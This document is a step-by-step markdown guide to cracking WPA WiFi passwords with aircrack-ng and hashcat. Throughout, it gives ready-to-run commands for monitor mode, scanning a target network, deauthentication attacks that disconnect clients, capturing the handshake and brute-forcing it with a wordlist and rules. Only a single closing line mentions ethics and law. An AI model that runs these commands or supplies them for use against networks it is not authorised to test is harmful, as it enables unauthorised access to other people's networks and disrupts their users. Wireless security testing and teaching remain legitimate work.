# 🕵️‍♂️ How to Crack WiFi: A Method Utilizing Handshakes 📡

## **🛠 Tools Required**

- **Aircrack-ng:** [https://github.com/aircrack-ng/aircrack-ng](https://github.com/aircrack-ng/aircrack-ng) 🌐
- **Hashcat:** [https://github.com/hashcat/hashcat](https://github.com/hashcat/hashcat) 🔓

## **🔧 Setup and Monitoring**

### 📶 Identify Wireless Adapter
- **Command:** `iwconfig` or `ifconfig`

### 🚫 Kill Competing Processes
- **Command:** `sudo airmon-ng check kill`

### 📡 Enable Monitor Mode
- **Command:** `airmon-ng start <network interface>`
- **Note:** The card name often changes after being switched to monitor mode, confirm the name of your card with `iwconfig` or `ifconfig`.

## **🔍 Network Scanning**

### 🐜 Scan for Networks
- **Command:** `sudo airodump-ng <network interface>`

### 🎯 Focus Scan on Target Network
- **Command:** `sudo airodump-ng <network interface> --bssid <AP>`

## **📦 Capture Packets**

### 💾 Capture and Save Packets
- **Command:** `sudo airodump-ng -c <channel number> --bssid <AP BSSID> <network interface> -w <path for saved packets file>`

### 🛑 De-authentication Attack
- **Command:** `sudo aireplay-ng -a <BSSID of the AP> --deauth <time> <network interface>`
- **Tip:** Targeting a client may be more effective than targeting the access point directly: `sudo aireplay-ng -a <BSSID of the AP> -c <BSSID of the Client> --deauth <time> <network interface>`

### ✅ Handshake Capture
- **Watch for:** `WPA handshake: <mac address>`
- **Tip:** If `WPA handshake: <mac address>` isn't displayed, you haven't captured the handshake. Try targeting the AP itself and each client individually. 

## **🔄 Post-Capture Processing**

### 🔄 Return Wireless Adapter to Managed Mode
- **Command:** `sudo service NetworkManager restart`

### 🔑 Convert Handshake to Hashcat Format
- **Tool:** [Hashcat cap2hashcat](https://hashcat.net/cap2hashcat/)
- **Tip:** Upload the saved packets file. If the file is to big (>20MB), optimize the file using the command below.

### 🗑 Optimize Capture File Size
- **Command:** `tshark -r dumpfile.cap/pcap -R "(wlan.fc.type_subtype == 0x00 || wlan.fc.type_subtype == 0x02 || wlan.fc.type_subtype == 0x04 || wlan.fc.type_subtype == 0x05 || wlan.fc.type_subtype == 0x08 || eapol)" -2 -F pcapng -w stripped.pcapng`

## **🔓 Cracking the Handshake**

### 🚀 Crack with Hashcat
- **Command:** `hashcat -m 22000 -o /path/to/output/file /path/to/converted/handshake/hash /path/to/wordlist -r /path/to/ruleset`
- **Recommended Wordlist and Ruleset:** Rockyou.txt and OneRuleToRuleThemStill

---

📌 Remember to operate ethically and within the bounds of the law when using these tools.
